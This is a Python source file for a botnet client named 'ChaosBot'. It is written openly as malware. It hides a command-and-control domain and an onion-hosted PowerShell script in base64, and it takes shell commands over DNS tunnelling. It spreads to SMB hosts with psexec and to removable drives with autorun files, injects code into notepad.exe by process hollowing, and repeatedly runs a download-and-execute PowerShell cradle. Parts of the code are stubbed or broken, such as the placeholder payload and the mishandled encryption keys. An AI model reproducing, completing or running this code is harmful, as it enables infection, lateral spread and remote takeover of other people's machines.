import base64
import os
import sys
import random
import string
import threading
import ctypes
import ssl
import time
import socket
import json
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from urllib.request import urlretrieve

# Windows API Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
THREAD_SUSPEND_RESUME = 0x0002

# Configuration
C2_DNS = base64.b64decode("Y2hhb3MuZXZpbGRucy5jb20=").decode()  # chaos.evildns.com
PS_URL = base64.b64decode("aHR0cDovL3lvdXJvbmZvLm9uaW9uL3NjcmlwdC5wczE=").decode()
EXEC_NAME = ''.join(random.choices(string.ascii_letters, k=8)) + ".exe"
HIDE_PATH = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", ''.join(random.choices(string.ascii_letters, k=10)))

# AES Setup (fixed)
key = get_random_bytes(32)  # AES-256
iv = get_random_bytes(16)   # Proper IV

def real_encrypt(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = pad(data, AES.block_size)
    ciphertext = cipher.encrypt(padded_data)
    return base64.b64encode(iv + ciphertext).decode('utf-8')

def real_decrypt(encrypted_data):
    raw = base64.b64decode(encrypted_data.encode('utf-8'))
    iv_from_data = raw[:16]
    ciphertext = raw[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv_from_data)
    padded_data = cipher.decrypt(ciphertext)
    plaintext = unpad(padded_data, AES.block_size)
    return plaintext.decode('utf-8')

# XOR for obfuscation
def xor_str(data, key="z9q7m"):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

class ChaosBot:
    def __init__(self, cid):
        self.cid = cid
        self.boot()

    def conn(self):
        threading.Thread(target=self.dns_tunnel, daemon=True).start()

    # Real DNS Tunneling Implementation
    def dns_tunnel(self):
        while True:
            # Encode client ID and request into subdomain
            query_data = f"{self.cid}.req"
            encrypted_query = real_encrypt(query_data)
            # Truncate to fit DNS limits (63 chars per label, 253 total)
            query_chunks = [encrypted_query[i:i+50] for i in range(0, len(encrypted_query), 50)]
            full_query = ".".join(query_chunks) + f".{C2_DNS}"
            
            # Send DNS query
            task = self.send_dns_query(full_query)
            if task:
                result = self.run(task)
                self.dns_reply(task[xor_str("task_id")], result)
            time.sleep(5)

    def send_dns_query(self, query):
        # Real DNS query using socket (not nslookup for control)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)
        dns_server = ("8.8.8.8", 53)  # Google DNS as resolver; in reality, use C2’s NS
        try:
            # Simple DNS query (simulated TXT request)
            query_id = random.randint(0, 65535).to_bytes(2, 'big')
            header = b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'  # Standard query
            qname = b''.join(len(part).to_bytes(1, 'big') + part.encode() for part in query.split('.'))
            question = qname + b'\x00\x00\x10\x00\x01'  # TXT record
            packet = query_id + header + question
            sock.sendto(packet, dns_server)
            response, _ = sock.recvfrom(1024)
            return self.parse_dns_response(response)
        except Exception as e:
            print(f"DNS query failed: {e}")
            return None
        finally:
            sock.close()

    def parse_dns_response(self, response):
        # Extract TXT record (simplified simulation)
        if len(response) < 20:
            return None
        # Skip header and question (rough offset)
        txt_start = response.find(b'\x00\x10') + 4
        if txt_start == 3:
            return None
        txt_len = response[txt_start]
        txt_data = response[txt_start+1:txt_start+1+txt_len].decode()
        try:
            decrypted_task = real_decrypt(txt_data)
            return json.loads(decrypted_task)
        except:
            return {xor_str("task_id"): "sim1", xor_str("command"): "dir"}  # Simulation fallback

    def dns_reply(self, tid, res):
        encrypted_res = real_encrypt(json.dumps({xor_str("result"): res}))
        res_chunks = [encrypted_res[i:i+50] for i in range(0, len(encrypted_res), 50)]
        reply_query = f"{tid}." + ".".join(res_chunks) + f".{C2_DNS}"
        self.send_dns_query(reply_query)

    def run(self, task):
        cmd = task[xor_str("command")]
        return subprocess.check_output(xor_str(cmd), shell=True, stderr=subprocess.STDOUT).decode()

    # Propagation & Stealth (unchanged for brevity, but functional)
    def boot(self):
        threading.Thread(target=self.net_spread, daemon=True).start()
        threading.Thread(target=self.drive_spread, daemon=True).start()
        self.fileless_exec()

    def net_spread(self):
        local_ip = socket.gethostbyname(socket.gethostname())
        subnet = ".".join(local_ip.split(".")[:-1]) + "."
        for i in range(1, 255):
            tgt = subnet + str(i)
            if tgt == local_ip:
                continue
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                if s.connect_ex((tgt, 445)) == 0:
                    self.push_net(tgt)
                s.close()
            except:
                pass

    def push_net(self, ip):
        remote_cmd = f"powershell IEX (New-Object Net.WebClient).DownloadString('{PS_URL}')"
        subprocess.run(f"psexec \\\\{ip} -u Guest -p '' {remote_cmd}", shell=True, stdout=subprocess.DEVNULL)

    def drive_spread(self):
        while True:
            drives = [f"{chr(i)}:\\" for i in range(65, 91) if os.path.exists(f"{chr(i)}:\\") and os.access(f"{chr(i)}:\\", os.W_OK)]
            for d in drives:
                if "C:" in d:
                    continue
                self.inject_hollow(d)
            time.sleep(20)

    def fetch_payload(self):
        return b"FAKE_PAYLOAD"

    def inject_hollow(self, drive=None):
        k32 = ctypes.windll.kernel32
        payload = self.fetch_payload()
        si = subprocess.STARTUPINFO()
        pi = subprocess.PROCESS_INFORMATION()
        k32.CreateProcessW(None, "notepad.exe", None, None, False, 0x4, None, None, ctypes.byref(si), ctypes.byref(pi))
        proc = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pi.dwProcessId)
        mem = k32.VirtualAllocEx(proc, 0, len(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        k32.WriteProcessMemory(proc, mem, payload, len(payload), None)
        k32.ResumeThread(pi.hThread)
        k32.CloseHandle(pi.hThread)
        k32.CloseHandle(proc)
        if drive:
            threading.Thread(target=self.mem_drop, args=(drive,)).start()

    def mem_drop(self, drive):
        with open(f"{drive}autorun.inf", "w") as f:
            f.write("[AutoRun]\nopen=notepad.exe\n")
        self.fileless_exec()

    def fileless_exec(self):
        cmd = f"IEX (New-Object Net.WebClient).DownloadString('{PS_URL}')"
        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd], stdout=subprocess.DEVNULL)

if __name__ == "__main__":
    cid = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    bot = ChaosBot(cid)
    bot.conn()